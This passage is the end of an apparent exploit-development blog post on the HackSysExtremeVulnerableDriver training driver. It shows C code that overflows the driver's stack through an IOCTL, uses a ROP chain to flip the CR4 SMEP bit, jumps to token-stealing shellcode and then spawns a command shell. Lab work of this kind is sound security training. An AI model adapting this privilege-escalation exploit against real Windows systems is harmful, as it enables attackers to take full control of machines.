</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 POP_RCX     <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9b2952</span>; <span style="color:#6272a4">// pop rcx; ret;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">const</span> u64 MOV_CR4_RCX <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9aa31b</span>; <span style="color:#6272a4">// mov cr4, rcx; ret;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	HANDLE hDriver <span style="color:#ff79c6">=</span> CreateFileA(
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>		GENERIC_READ <span style="color:#ff79c6">|</span> GENERIC_WRITE,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
</span></span><span style="display:flex;"><span>		FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (hDriver <span style="color:#ff79c6">==</span> INVALID_HANDLE_VALUE) <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2072</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 payloadSize   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2500</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 shellcodeSize <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4096</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	LPVOID payload   <span style="color:#ff79c6">=</span> VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>, payloadSize,   MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>	LPVOID shellcode <span style="color:#ff79c6">=</span> VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>, shellcodeSize, MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>payload <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>shellcode) <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	memset(payload, <span style="color:#f1fa8c">&#39;\x41&#39;</span>, payloadSize);
</span></span><span style="display:flex;"><span>	memcpy(shellcode, token_steal, <span style="color:#ff79c6">sizeof</span>(token_steal));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u64<span style="color:#ff79c6">*</span> rop <span style="color:#ff79c6">=</span> (u64<span style="color:#ff79c6">*</span>)((u64)payload <span style="color:#ff79c6">+</span> offset);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//*(u64*)((u64)payload + offset) = (u64)shellcode;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	u64 index <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> POP_RCX;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xb50ef8</span> <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">1UL</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> MOV_CR4_RCX;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> (u64)shellcode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	DeviceIoControl(
</span></span><span style="display:flex;"><span>		hDriver,
</span></span><span style="display:flex;"><span>		HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
</span></span><span style="display:flex;"><span>		payload,
</span></span><span style="display:flex;"><span>		(DWORD)payloadSize,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	system(<span style="color:#f1fa8c">&#34;cmd&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre><p><img src="/assets/img/2025-01-23/poc.png" alt="poc"></p>

    </article>
  </div>
</body>
</html>